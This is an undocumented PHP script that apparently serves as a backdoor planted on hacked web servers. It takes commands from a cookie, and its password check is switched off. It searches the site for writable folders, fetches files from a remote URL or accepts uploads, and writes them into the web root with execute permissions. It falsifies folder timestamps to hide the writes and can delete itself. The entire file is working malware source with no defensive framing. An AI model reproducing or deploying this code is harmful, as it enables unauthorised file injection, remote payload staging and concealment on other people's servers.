<?php
define('CANNOT_SELECT_NAME_CODE', 1);
define('VERSION', 5);

function StdCRC32(&$uValue) {
	$uCRC=crc32($uValue);
	if ($uCRC&0x80000000) {
		$uCRC^=0xffffffff;
		$uCRC+=1;
		$uCRC=-$uCRC;
	}
	
	return $uCRC;
}

function calcHash($content) {
	$content=str_replace(array(
			"\t",
			"\r",
			"\n",
			' '
	), '', $content);
	$crc1=strtolower(md5($content));
	$crc1=substr($crc1, 0, 20);
	return $crc1;
}

function normalize($path) {
	return str_replace('\\', '/', $path);
}

function getDocRoot() {
	return normalize($_SERVER['DOCUMENT_ROOT']);
}

function printout($text){
	if(!headers_sent())
		@header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
		print($text);
}

class SelectNameException extends RuntimeException {

	function __construct() {
		$this->code=CANNOT_SELECT_NAME_CODE;
		$this->message='cannot select new name';
	}
}
class DirtyOutput {

	const bufferSize=20;

	private $_buffer=array();

	private $_lineBegin=false;

	const delimiter='|!';

	const delimiter2='|$';	

	function printError(Exception $e) {
		$errorCode=$e->getCode();
		$errorCode=empty($errorCode) ? '0' : $e->getCode();
		printout("RESULT_ERROR".self::delimiter.$errorCode.self::delimiter.$e->getMessage().self::delimiter.$e->getTraceAsString());
		$this->flush();
	}

	function startLines() {
		$this->_buffer[]='===###start###===';
	}

	function printOk($data) {
		$args=func_get_args();		
		printout('RESULT_OK'.self::delimiter.'0'.self::delimiter.join(self::delimiter2, $args));
	}

	function printLine($line) {
		$this->_buffer[]=$line;
		if (count($this->_buffer)>self::bufferSize)
			$this->flush();
	}

	function flush() {
		foreach($this->_buffer as $line)
			printout($line."\n");
		$this->_buffer=array();
		flush();
	}

	function funishLines() {
		$this->_buffer[]='===###end###===';
		$this->flush();
	}
}
class App {

	const auth='bf99aebf14958a22';

	const cookieName='__kgtr';

	private $_params=array();

	private $_out;

	function __construct() {
		$this->_out=new DirtyOutput();
		$raw=$_COOKIE[self::cookieName];
		$data=json_decode(urldecode($raw), true);
		$this->_params=$data;
	}

	function run() {
		try {
			$this->_auth();
			$cmd=$this->_getParam('cmd');
			$this->$cmd();
		} catch(Exception $e) {
			$err=error_get_last();
			$this->_out->printError($e);
		}
	}

	function status() {
		$host=strtolower($_SERVER['HTTP_HOST']);
		$host=str_replace('www.', '', $host);
		$token=md5($host);
		
		$srv=$this->_getParam('server');
		$content=@file_get_contents($srv);
		$srvOk=($content=='OK') ? 1 : 0;
		
		$docRoot=getDocRoot();		
		
		$this->_out->printOk(VERSION, $token, $srvOk, $docRoot, __FILE__);
	}

	function findDirs() {
		$docRoot=getDocRoot();
		$finder=new Finder($this->_getParam('limit'), $this->_getParam('exts'), $this->_getParam('count'), $docRoot, $this->_out);
		$this->_out->startLines();
		$this->_out->printLine("#{$docRoot}");
		$finder->find($docRoot);
		$this->_out->funishLines();
	}

	function uploadUrl() {
		$path=$this->_getTargetPath();
		
		$url=$this->_getParam('url');
		$data=@file_get_contents($url);
		if ($data===false)
			throw new RuntimeException('cannot load data');
		
		if (strpos($data, 'RESULT_OK')===false)
			throw new RuntimeException("invalid data ".substr($data, 0, 30));
		
		list($dummy, $crc, $content)=explode('|', $data, 3);
		
		$fcrc=StdCRC32($content);
		if ($crc!=$fcrc)
			throw new RuntimeException("crc not equal. uploaded {$fcrc}, expected {$crc}");
		
		$hashes=$this->_getParam('hashes');
		$pairs=explode('|', $hashes);
		foreach($pairs as $pair) {
			list($key, $value)=explode(':', $pair);
			$pattern='['.$key.']';
			if(strpos($content, $pattern)!==false){
				$content=str_replace($pattern, $value, $content);
				break;
			}
		}
		
		$hash=$this->_save($path, $content);
		$relPath=$this->_getRelPath($path);
		$this->_out->printOk($hash, $relPath);
	}

	function uploadFile() {
		$info=$_FILES;
		if ($info['f']['error']!=0)
			throw new RuntimeException("upload is failed");
		
		$content=@file_get_contents($info['f']['tmp_name']);
		$this->_proccess($this->_getParam('crc'), $content);
	}

	function uploadGet() {
		$input=fopen('php://input', 'r');
		$content='';
		while(!feof($input))
			$content.=fread($input, 8192);
		fclose($input);
		
		$this->_proccess($this->_getParam('crc'), $content);
	}

	function clean() {
		if (@unlink(__FILE__)) {
			@clearstatcache();
			if(!file_exists(__FILE__)){
				$this->_out->printOk("clean");
				return;
			}		
		} 
		throw new RuntimeException('cannot clean');
	}

	function _proccess($expCrc, $content) {
		$fcrc=StdCRC32($content);
		if ($expCrc!=$fcrc)
			throw new RuntimeException("crc not equal. uploaded {$fcrc}, expected {$expCrc}");
		
		$path=$this->_getTargetPath();
		$hash=$this->_save($path, $content);
		$relPath=$this->_getRelPath($path);
		$this->_out->printOk($hash, $relPath);
	}

	function _save($path, $data) {
		$src=StdCRC32($data);
		
		$parentDir=dirname($path);
		$storedTime=@filemtime($parentDir);
		
		$writed=file_put_contents($path, $data);
		if (!$writed)
			throw new RuntimeException('data not writed to: '.$path);
		
		@clearstatcache();
		$rdata=@file_get_contents($path);
		$rcrc=StdCRC32($rdata);
		if ($src!=$rcrc) {
			@unlink($path);
			throw new RuntimeException("write/read crc not equal");
		}
		
		@chmod($path, 0755);
		@touch($parentDir, $storedTime, $storedTime);
		$fileTime=$storedTime-(mt_rand(3600*24*14, 3600*24*31*3));
		@touch($parentDir, $fileTime, $fileTime);
		return calcHash($rdata);
	}

	function _auth() {
		return;
		$auth=$this->_getParam('auth');
		$hash=strtolower(substr(md5($auth), 0, 16));
		if ($hash!=self::auth)
			throw new RuntimeException('auth error');
	}

	function _getTargetPath() {
		$relPath=$this->_getParam('dir');
		$targetDir=getDocRoot().$relPath;
		$targetDir=rtrim($targetDir, "\\/");
		$fileNames=explode(',', $this->_getParam('names'));
		foreach($fileNames as $fileName) {
			$path=$targetDir.'/'.$fileName;
			if (!file_exists($path))
				return $path;
		}
		throw new SelectNameException();
	}

	function _getRelPath($fullPath) {
		$fullPath=normalize($fullPath);
		$docRoot=getDocRoot();
		return str_replace($docRoot, '', $fullPath);
	}

	function _getParam($key) {
		if (!isset($this->_params[$key]))
			throw new RuntimeException("param key '$key' not exists");
		return $this->_params[$key];
	}
}
class Finder {

	private $_count;

	private $_fileExts;

	private $_fileCount;

	private $_docRoot;

	private $_out;

	private $_found=0;

	function __construct($count, $fileExts, $fileCount, $docRoot, $out) {
		$this->_count=$count;
		$this->_fileExts='{'.$fileExts.'}';
		$this->_fileCount=$fileCount;
		$this->_docRoot=normalize($docRoot);
		$this->_out=$out;
	}

	function find($path) {
		if ($this->_found>$this->_count)
			return;
		
		$path=normalize($path);
		$path=rtrim($path, "\\/");
		
		if(is_link($path))
			return;
		
		if ($this->_isProtected($path))
			return;
		
		if (is_writable($path)) {
			$files=glob($path."/*.{$this->_fileExts}", GLOB_BRACE);
			if (sizeof($files)>=$this->_fileCount) {
				$rel=$this->_getRelative($path);
				$this->_found++;
				$this->_out->printLine('<#'.$rel.'#>');
			}
			
			unset($files);
		}
		
		$dirs=glob($path."/*", GLOB_MARK|GLOB_ONLYDIR);
		foreach($dirs as $dir) {
			if (preg_match("#^(wp-admin|admin|administrator|temp|tmp|cache)$#i", basename($dir))) {
				continue;
			}
			$this->find($dir);
		}
	}

	function _isProtected($path) {
		$htaFile=$path.'/.htaccess';
		if (!file_exists($htaFile)) {
			return false;
		}
		$content=@file_get_contents($htaFile);
		$content=str_replace(' ', '', strtolower($content));
		$content=strtolower($content);
		
		$markers=array('php_flagengine','authuserfile');
		foreach($markers as $marker) {
			if (strpos($content, $marker)!==false)
				return true;
		}
		
		$denies=substr_count($content, 'denyfromall');
		$ifdenies=0;
		$result=array();
		preg_match_all('%<(?:if|files)[^>]+>[^<]+denyfromall[^<]*</(?:if|files)%si', $content, $result, PREG_PATTERN_ORDER);
		if (count($result)>0) {
			$ifdenies=count($result[0]);
		}
		if ($denies!=$ifdenies)
			return true;
			
		return false;
	}

	function _getRelative($path) {
		$rel=str_replace($this->_docRoot, '', $path);
		if (empty($rel))
			$rel='/';
		return $rel;
	}
}

$app=new App();
$app->run();